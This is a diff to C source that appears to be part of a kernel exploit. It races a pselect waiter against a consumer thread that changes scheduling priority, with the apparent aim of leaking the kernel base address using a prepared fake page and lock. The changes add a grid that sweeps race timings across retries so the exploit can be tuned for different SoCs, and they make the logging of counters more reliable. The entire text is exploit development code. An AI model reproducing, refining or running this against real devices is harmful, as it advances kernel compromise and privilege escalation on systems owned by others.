@@ -1,8 +1,61 @@
 #include "common.h"
 
 #define SLIDE_MAX_ATTEMPTS 20
+#ifndef SLIDE_CONSUME_DELAY
 #define SLIDE_CONSUME_DELAY 2000
+#endif
 #define SLIDE_CONSUME_USEC 0
+
+/*
+ * How long to wait for the consumer to publish its counters before logging
+ * them. The consumer stores last_sched_ret/sched_ok and only then raises
+ * slide_consume_stop, so that flag is what makes the numbers meaningful.
+ * Bounded, so a consumer that never ran cannot hang the attempt.
+ */
+#define SLIDE_CONSUME_SETTLE_SPINS (1 << 20)
+
+/*
+ * Optional per-attempt timing sweep, opt-in per target.
+ *
+ * The two delays below set the race window between the waiter entering pselect
+ * and the consumer changing its priority. They are pure empirical tuning — no
+ * BTF, symbol or disassembly derives them — and the right values depend on the
+ * SoC's clocks, so a target on different silicon cannot inherit them. Rather
+ * than rebuild per guess, a target can opt into walking a grid across the
+ * retries it already performs, and the log records which pair each attempt
+ * used so a success identifies the winner.
+ *
+ * Off by default: targets that are already tuned keep their exact behaviour.
+ */
+#ifndef SLIDE_TIMING_SWEEP
+#define SLIDE_TIMING_SWEEP 0
+#endif
+
+static const int slide_spin_sweep[] = {
+  SLIDE_CONSUME_DELAY, 500, 1000, 4000, 8000, 250, 16000,
+};
+static const int slide_enter_sweep_usec[] = {
+  PSELECT_ENTER_DELAY_USEC, 20000, 100000, 5000,
+};
+
+static int slide_attempt_index;
+
+static int slide_spin_delay(void) {
+  if (!SLIDE_TIMING_SWEEP) {
+    return SLIDE_CONSUME_DELAY;
+  }
+  int n = (int)(sizeof(slide_spin_sweep) / sizeof(slide_spin_sweep[0]));
+  return slide_spin_sweep[slide_attempt_index % n];
+}
+
+static int slide_enter_delay_usec(void) {
+  if (!SLIDE_TIMING_SWEEP) {
+    return PSELECT_ENTER_DELAY_USEC;
+  }
+  int nspin = (int)(sizeof(slide_spin_sweep) / sizeof(slide_spin_sweep[0]));
+  int n = (int)(sizeof(slide_enter_sweep_usec) / sizeof(slide_enter_sweep_usec[0]));
+  return slide_enter_sweep_usec[(slide_attempt_index / nspin) % n];
+}
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 /*
@@ -224,9 +277,28 @@ void slide_pselect_stack_copy(void) {
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
+
+  // Let the consumer publish before reading its counters. It stores
+  // last_sched_ret/sched_ok and only afterwards raises slide_consume_stop, so
+  // without this wait the print below regularly caught the initial -1/0 — which
+  // reads exactly like sched_setattr having failed when it had not been called
+  // yet. settled=0 means "these counters are not trustworthy", which is not the
+  // same as a failure.
+  int settled = 0;
+  for (int i = 0; i < SLIDE_CONSUME_SETTLE_SPINS; i++) {
+    if (atomic_load(&slide_consume_stop)) {
+      settled = 1;
+      break;
+    }
+    __asm__ volatile("yield" ::: "memory");
+  }
+
+  pr_info("slide pselect returned ret=%d errno=%d settled=%d attempt=%d "
+          "spin=%d enter_usec=%d calls=%d sched_ok=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
-          ret, saved_errno, atomic_load(&slide_consume_calls),
+          ret, saved_errno, settled, slide_attempt_index,
+          slide_spin_delay(), slide_enter_delay_usec(),
+          atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
@@ -259,7 +331,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     if (SLIDE_CONSUME_USEC) {
       usleep(SLIDE_CONSUME_USEC);
     } else {
-      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
+      int spin_delay = slide_spin_delay();
+      for (int spin = 0; spin < spin_delay; spin++) {
         __asm__ volatile("yield" ::: "memory");
       }
     }
@@ -270,7 +343,7 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     }
 
     if (seq == 1) {
-      usleep(PSELECT_ENTER_DELAY_USEC);
+      usleep(slide_enter_delay_usec());
     }
 
     int tid = atomic_load(&slide_waiter_tid);
@@ -438,6 +511,9 @@ uint64_t slide_child_leak_stext(void) {
 
 int slide_leak_kernel_base(void) {
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
+    // Set before the fork so the child's consumer picks up this attempt's
+    // timing pair; inherited across fork, never shared back.
+    slide_attempt_index = attempt - 1;
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
